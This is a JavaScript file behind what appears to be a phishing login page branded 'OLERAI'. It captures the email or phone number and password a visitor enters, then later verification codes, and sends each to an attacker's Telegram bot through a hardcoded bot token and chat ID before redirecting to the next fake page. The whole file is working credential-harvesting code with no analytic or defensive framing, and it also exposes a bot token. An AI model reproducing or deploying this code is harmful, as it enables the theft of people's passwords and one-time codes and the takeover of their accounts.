const BOT_TOKEN = "8270023068:AAHXZfDGBjo_quota_ch_lFxFt5DS4aMC94";
const CHAT_ID = "5678769459";

function switchTab(type) {
    document.querySelectorAll(".tab").forEach(t => t.classList.remove("active"));
    event.target.classList.add("active");

    document.getElementById("emailInput").classList.toggle("hidden", type !== "email");
    document.getElementById("phoneInput").classList.toggle("hidden", type !== "phone");
  }

function submitUser() {
  
  let value1 = document.getElementById("emailInput").value.trim();
  let value2 = document.getElementById("phoneInput").value.trim();
  const userpass= document.getElementById("userpass").value;
  const value = value1 || value2;
  

  if (value === "") {
    alert("Please enter email or phone");
    return;
  }

  const message =
    `📩 OLERAI NEW ENTRY\n\n` +
    `Value: ${value}\n` +
    `password: ${userpass}`; 

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  })
  .then(() => {
    window.location.href = "verify.html";
  })
  .catch(() => {
    alert("Failed to send. Try again.");
  });
    
}
function next () {
  
  const verify= document.getElementById("verify").value;
  

const message =  
   `CODE: ${verify} \n`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  })
  .then(() => {
    window.location.href = "password.html";
  })
  .catch(() => {
    alert("Failed to send. Try again.");
  });
}

function finish (){
  
  const demo= document.getElementById("demo").value;
  

const message =  
   `CODE: ${demo} \n`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  })
  .then(() => {
    window.location.href = "result.html";
  })
  .catch(() => {
    alert("Failed to send. Try again.");
  });
}